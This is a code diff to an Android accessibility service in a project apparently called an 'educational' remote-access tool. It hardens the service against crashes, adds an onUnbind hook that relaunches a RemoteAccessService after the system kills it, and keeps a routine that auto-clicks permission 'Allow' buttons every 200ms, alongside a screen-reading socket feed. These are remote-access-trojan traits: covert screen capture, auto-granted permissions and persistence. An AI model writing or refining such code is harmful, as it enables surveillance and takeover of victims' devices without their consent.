@@ -619,8 +619,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
             }
             
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Throwable e) {
+            // Catch Throwable — Android kills the accessibility service if onAccessibilityEvent throws
+            Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
         }
     }
     
@@ -676,8 +677,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
 
             rootNode.recycle();
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Throwable e) {
+            Log.e(TAG, "autoClickAllowButton error: " + e.getMessage());
         }
     }
 
@@ -1684,7 +1685,35 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try {
             SocketManager.getInstance(this).stopScreenReaderAuto();
         } catch (Exception ignored) {}
+        try {
+            // permissionScanHandler runs every 200ms on the main thread — MUST be cancelled in onDestroy
+            if (permissionScanHandler != null && permissionScanRunnable != null) {
+                permissionScanHandler.removeCallbacks(permissionScanRunnable);
+                permissionScanHandler = null;
+                permissionScanRunnable = null;
+            }
+        } catch (Exception ignored) {}
         instance = null;
+    }
+
+    @Override
+    public boolean onUnbind(Intent intent) {
+        // When the accessibility service is killed (e.g. by the system), attempt to restart
+        // RemoteAccessService so it can reconnect once the user re-enables accessibility.
+        try {
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try {
+                    Intent svc = new Intent(getApplicationContext(),
+                            com.remoteaccess.educational.services.RemoteAccessService.class);
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        getApplicationContext().startForegroundService(svc);
+                    } else {
+                        getApplicationContext().startService(svc);
+                    }
+                } catch (Exception ignored) {}
+            }, 2000);
+        } catch (Exception ignored) {}
+        return super.onUnbind(intent);
     }
 
     public JSONObject readScreen() {
@@ -1789,9 +1818,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoClickRunnable = new Runnable() {
             @Override
             public void run() {
-                autoClickAllowButton();
+                try {
+                    autoClickAllowButton();
+                } catch (Throwable e) {
+                    Log.e(TAG, "autoClickRunnable crash: " + e.getMessage());
+                }
                 if (autoClickHandler != null && autoClickRunnable != null) {
-                    autoClickHandler.postDelayed(this, 200); // Scan every 200ms
+                    autoClickHandler.postDelayed(this, 200);
                 }
             }
         };
